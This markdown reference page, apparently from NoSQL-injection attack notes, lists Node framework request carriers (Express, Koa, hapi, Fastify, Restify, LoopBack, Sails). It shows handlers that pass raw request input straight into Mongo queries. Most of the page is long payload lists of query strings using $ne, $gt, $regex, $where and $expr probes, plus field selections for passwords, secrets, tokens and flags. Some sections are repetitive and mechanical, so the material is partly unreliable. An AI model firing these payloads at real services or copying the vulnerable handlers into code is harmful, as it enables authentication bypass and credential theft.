# Node/Express shapes — the carriers by framework

## `express` — the `req.body`/`req.query`/`req.params`/`req.headers`/`req.cookies`

```javascript
app.use(express.json())
app.use(express.urlencoded({extended: true}))
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended: true}))
app.use(cookieParser())
app.set("query parser", "extended")
app.set("query parser", "simple")
app.set("query parser", "extended")
app.set("query parser", "qs")
app.set("query parser", "querystring")
app.set("query parser", (str) => qs.parse(str, {depth: 10}))
app.set("query parser", (str) => qs.parse(str, {parameterLimit: 10000}))
app.set("query parser", (str) => qs.parse(str, {arrayLimit: 100}))
app.set("query parser", (str) => qs.parse(str, {allowDots: true}))
app.set("query parser", (str) => qs.parse(str, {allowPrototypes: true}))
app.set("query parser", (str) => qs.parse(str, {plainObjects: true}))
app.set("query parser", (str) => qs.parse(str, {parseArrays: false}))
app.set("query parser", (str) => qs.parse(str, {comma: true}))
app.set("query parser", (str) => qs.parse(str, {charset: "utf-8"}))
app.set("query parser", (str) => qs.parse(str, {charset: "iso-8859-1"}))
app.set("query parser", (str) => qs.parse(str, {charsetSentinel: true}))
app.set("query parser", (str) => qs.parse(str, {decoder: (s) => decodeURIComponent(s)}))
app.set("query parser", (str) => qs.parse(str, {delimiter: ";"}))
app.set("query parser", (str) => qs.parse(str, {depth: 0}))
app.set("query parser", (str) => qs.parse(str, {depth: 20}))
app.set("query parser", (str) => qs.parse(str, {arrayLimit: 0}))
app.set("query parser", (str) => qs.parse(str, {parameterLimit: 0}))
app.set("query parser", (str) => qs.parse(str, {allowDots: false}))
app.set("query parser", (str) => qs.parse(str, {allowPrototypes: false}))
app.set("query parser", (str) => qs.parse(str, {plainObjects: false}))
app.set("query parser", (str) => qs.parse(str, {parseArrays: true}))
app.set("query parser", (str) => qs.parse(str, {comma: false}))
app.set("query parser", (str) => qs.parse(str, {charset: "utf-16"}))
app.set("query parser", (str) => qs.parse(str, {charsetSentinel: false}))
app.set("query parser", (str) => qs.parse(str, {decoder: (s) => s}))
app.set("query parser", (str) => qs.parse(str, {delimiter: "&"}))
app.set("query parser", (str) => qs.parse(str, {depth: 5}))
app.set("query parser", (str) => qs.parse(str, {arrayLimit: 20}))
app.set("query parser", (str) => qs.parse(str, {parameterLimit: 1000}))
app.set("query parser", "extended")
app.set("query parser", "simple")
```

`express` — `injection-points.md` / `carrier-qs-deep.md` / `carrier-json-deep.md`.

## `koa` — the `ctx.request.body`/`ctx.query`

```javascript
app.use(bodyParser())
router.post("/login", async (ctx) => {
  const user = await User.findOne({user: ctx.request.body.user})
})
```

`koa` — `injection-points.md`.

## `hapi` — the `request.payload`/`request.query`

```javascript
server.route({
  method: "POST",
  path: "/login",
  handler: async (request) => {
    const user = await User.findOne({user: request.payload.user})
  }
})
```

`hapi` — `injection-points.md`.

## `fastify` — the `request.body`/`request.query`/`request.headers`/`request.cookies`

```javascript
fastify.post("/login", async (request) => {
  const user = await User.findOne({user: request.body.user})
})
fastify.post("/login", async (request) => {
  const user = await User.findOne(request.body)
})
fastify.post("/login", async (request) => {
  const user = await User.findOne({user: request.body.user, pass: request.body.pass})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query.user})
})
fastify.get("/search", async (request) => {
  const users = await User.find(request.query)
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$ne]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$ne]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$gt]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$regex]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$in]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$exists]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$type]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$size]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$all]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$mod]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$elemMatch]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$where]"]})
})
fastify.get("/search", async (request) => {
  const users = await User.find({user: request.query["user[$not]"]})
})
```

`fastify` — `injection-points.md`.

## `restify` — the `req.body`/`req.query`

```javascript
server.post("/login", async (req, res) => {
  const user = await User.findOne({user: req.body.user})
})
```

`restify` — `injection-points.md`.

## `loopback` — the `filter`/`where`/`include`/`fields`/`sort`/`limit`/`skip`/`offset`

```javascript
GET /api/users?filter[where][user][$ne]=x
GET /api/users?filter[where][user][$gt]=
GET /api/users?filter[where][user][$regex]=^a
GET /api/users?filter[where][user][$in][]=admin
GET /api/users?filter[where][user][$exists]=true
GET /api/users?filter[where][user][$type]=string
GET /api/users?filter[where][user][$size]=0
GET /api/users?filter[where][user][$all][]=x
GET /api/users?filter[where][user][$mod][0]=4&filter[where][user][$mod][1]=0
GET /api/users?filter[where][user][$elemMatch][x][$gt]=0
GET /api/users?filter[where][user][$where]=this.pass
GET /api/users?filter[where][user][$not][$eq]=x
GET /api/users?filter[where][user][$not][$ne]=x
GET /api/users?filter[where][$or][0][user]=admin
GET /api/users?filter[where][$or][1][user]=root
GET /api/users?filter[where][$and][0][user][$ne]=x
GET /api/users?filter[where][$and][1][pass][$ne]=y
GET /api/users?filter[where][$nor][0][user]=nobody
GET /api/users?filter[where][$where]=this.user=='admin'
GET /api/users?filter[where][$expr][$eq][0][$substrCP][0]=$pass
GET /api/users?filter[where][$expr][$eq][0][$substrCP][1]=0
GET /api/users?filter[where][$expr][$eq][0][$substrCP][2]=4
GET /api/users?filter[where][$expr][$eq][1]=flag
GET /api/users?filter[fields][flag]=true
GET /api/users?filter[fields][pass]=true
GET /api/users?filter[fields][secret]=true
GET /api/users?filter[fields][token]=true
GET /api/users?filter[fields][key]=true
GET /api/users?filter[fields][role]=true
GET /api/users?filter[fields][admin]=true
GET /api/users?filter[fields][isAdmin]=true
GET /api/users?filter[fields][is_admin]=true
GET /api/users?filter[fields][privileges]=true
GET /api/users?filter[fields][permission]=true
GET /api/users?filter[fields][0]=flag
GET /api/users?filter[fields][1]=pass
GET /api/users?filter[fields][2]=secret
GET /api/users?filter[fields][3]=token
GET /api/users?filter[fields][4]=key
GET /api/users?filter[include]=roles
GET /api/users?filter[include][]=roles
GET /api/users?filter[include][relation]=roles
GET /api/users?filter[include][0]=roles
GET /api/users?filter[include][1]=perms
GET /api/users?filter[sort]=user
GET /api/users?filter[sort][]=user
GET /api/users?filter[sort][user]=1
GET /api/users?filter[sort][user]=-1
GET /api/users?filter[sort][flag]=1
GET /api/users?filter[sort][pass]=1
GET /api/users?filter[sort][secret]=1
GET /api/users?filter[sort][token]=1
GET /api/users?filter[sort][key]=1
GET /api/users?filter[sort][role]=1
GET /api/users?filter[sort][admin]=1
GET /api/users?filter[sort][isAdmin]=1
GET /api/users?filter[sort][is_admin]=1
GET /api/users?filter[sort][privileges]=1
GET /api/users?filter[sort][permission]=1
GET /api/users?filter[sort][0]=user
GET /api/users?filter[sort][1]=pass
GET /api/users?filter[sort][2]=secret
GET /api/users?filter[sort][3]=token
GET /api/users?filter[sort][4]=key
GET /api/users?filter[limit]=1
GET /api/users?filter[limit]=100
GET /api/users?filter[limit]=1000
GET /api/users?filter[skip]=0
GET /api/users?filter[skip]=10
GET /api/users?filter[skip]=100
GET /api/users?filter[offset]=0
GET /api/users?filter[offset]=10
GET /api/users?filter[offset]=100
```

`loopback` — `injection-points.md` — the `filter`/`where`/`include`/
`fields`/`sort`/`limit`/`skip`/`offset` — the object-injection.

## `sails`/`waterline` — the `where`/`select`/`sort`/`limit`/`skip`

```javascript
GET /users?where={"user":{"$ne":null}}
GET /users?where={"user":{"$gt":""}}
GET /users?where={"user":{"$regex":"^a"}}
GET /users?where={"user":{"$in":["admin","root"]}}
GET /users?where={"user":{"$exists":true}}
GET /users?where={"user":{"$type":"string"}}
GET /users?where={"user":{"$size":0}}
GET /users?where={"user":{"$all":["x"]}}
GET /users?where={"user":{"$mod":[4,0]}}
GET /users?where={"user":{"$elemMatch":{"x":{"$gt":0}}}}
GET /users?where={"user":{"$where":"this.pass"}}
GET /users?where={"user":{"$not":{"$eq":"x"}}}
GET /users?where={"$or":[{"user":"admin"},{"user":"root"}]}
GET /users?where={"$and":[{"user":{"$ne":null}},{"pass":{"$ne":null}}]}
GET /users?where={"$nor":[{"user":"nobody"}]}
GET /users?where={"$where":"this.user=='admin'"}
GET /users?where={"$expr":{"$eq":[{"$substrCP":["$pass",0,4]},"flag"]}}
GET /users?where={"$comment":"x"}
GET /users?where={"$natural":1}
GET /users?where={"$hint":{"user":1}}
GET /users?where={"$maxScan":100}
GET /users?where={"$snapshot":true}
GET /users?where={"$orderby":{"user":1}}
GET /users?where={"$readPreference":{"mode":"primary"}}
GET /users?where={"$explain":true}
GET /users?where={"$maxTimeMS":100}
GET /users?where={"$query":{"user":"admin"}}
GET /users?select=flag
GET /users?select[]=flag
GET /users?select=pass
GET /users?select=secret
GET /users?select=token
GET /users?select=key
GET /users?select=role
GET /users?select=admin
GET /users?select=isAdmin
GET /users?select=is_admin
GET /users?select=privileges
GET /users?select=permission
GET /users?sort=user
GET /users?sort[]=user
GET /users?sort[user]=1
GET /users?sort[user]=-1
GET /users?sort[flag]=1
GET /users?sort[pass]=1
GET /users?sort[secret]=1
GET /users?sort[token]=1
GET /users?sort[key]=1
GET /users?sort[role]=1
GET /users?sort[admin]=1
GET /users?sort[isAdmin]=1
GET /users?sort[is_admin]=1
GET /users?sort[privileges]=1
GET /users?sort[permission]=1
GET /users?limit=1
GET /users?limit=100
GET /users?limit=1000
GET /users?skip=0
GET /users?skip=10
GET /users?skip=100
```

`sails`/`waterline` — `injection-points.md`.
